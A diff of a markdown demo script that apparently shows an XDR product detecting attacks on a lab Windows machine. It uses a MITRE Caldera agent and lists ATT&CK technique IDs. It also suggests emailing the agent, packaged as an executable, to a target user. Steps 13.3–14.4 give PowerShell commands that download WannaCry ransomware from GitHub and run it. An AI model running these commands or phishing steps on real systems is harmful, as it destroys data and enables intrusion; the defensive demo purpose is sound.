@@ -41,34 +41,60 @@ This demo script was created to demonstrate the following use case:
 __How to demo
 
 1- Open the RDP Session and show the basecamp components running on background;
+
 2- Open the VisionOne Dashboard, and show the Actual Risk Level of this Windows Computer;
+
 3- Open the Mitre Caldera Management Console, and create a new malicious payload
+
 --Navigate > Agents > Click Here to Deploy an Agent > Select the "54ndc47" agent and Select the Windows Platform
+
 --Replace the "app.contact.http" information with the Linux IP Address (example http://linux-ip)
+
 --Copy the Powershell script created for this agent
+
+
 4- Execute the powershell script on the Windows Instance
 
 Optional (in case you want to demonstrate it in conjunction with CAS)
+
 4- Access the following website https://ps2exe.azurewebsites.net/ and generate an executable file using the powershell script you've copied in the previous step
+
 4.1- Send an email with the malicious attachment to the target user
 
-5- After you execute the PS script on the Windows Instance, you will find a new Client connected to the Mitre Caldera Portal (You can find it on Navigate > Agents manu)
+5- After you execute the PS script on the Windows Instance, you will find a new Client connected to the Mitre Caldera Portal (You can find it on Navigate > Agents menu)
+
 6- Now selecte the Navigate > Operations menu. We will use this option to start the operation following that Demo Script described previously on this page.
+
 7- Select the New Operation (name it as DemoXDR)
+
 8- Select the option Manual Command > Select your Agent > Run the command "Hostname". You will notice that after 1 minute +- the status of this request will become green. That means the command was executed successfuly. You can check the output clicking on the "star" icon, in the right side of the command you executed.
+
 9- Now select the option named "Potential Links". Using this option you can search through the Mitre Techniques, and test them as you believe will generate the best impact (based on the objectives you have for this demo).
+
 10- The following Mitre Techniques can help you to increase the risk level of the Windows Machine quickly, so if you want, this could be the best path to follow and have the Automated Response actions triggered.
+
 10.1- T1059.001, T1059.001, T1113, T1115, T1105, T1105, T1003.001, T1055.002, T1003.001, T1059.001, T1059.001, T1548.002, T1496, T1491
+
 11- Check the VisionOne Portal, wait for the new logs (+-5 minutes) and look to the Risk Level of the Windows Instance. The number is increasing, right?
+
 12- Check now the Observed Attack Techniques and the Workbenches. You will also find many detections! Its a good moment to show to your customer how to investigate and find what was detected or not by VisionOne.
+
 13- After you showed all the information detected by VisionOne, it's time to drop the Ransomware file to the Windows Machine, and make sure the ransomware was executed successfuly.
+
 13.1- To do that, select the Navigate > Operations. Create a new Operation named Ransomware.
+
 13.2- Select the "Manual Command" Option, Select your target, then select the PS> interpreter.
+
 13.3- Run the following commands "Invoke-WebRequest -Uri https://github.com/limiteci/WannaCry/raw/main/WannaCry.EXE -OutFile wcry.exe"
+
 14.4- After the first command was successfuly executed, run the next command "Start-Process wcry.exe"
+
 15- If you check the Windows Instance a few seconds later, you will find the machine is encrypted. In a 5 minutes period of time, if the Secure Access Rules you've created is enabled, you should lost the RDP Access to your Windows Instance. That means the VisionOne was able to detect the changes on the Risk Level, and then followed with the automated isolation for any devices with risk level >=60.
+
 16- You can check the detection logs and actions using the VisionOne Portal. You can go through the Device Risk Level, Workbenches, Observed Attack Techniques and Response Management menus, which will highlight all the detections and actions takes due to this new high risk computer detected during this demo.
 
 
-https://ps2exe.azurewebsites.net/
+
+
+
 
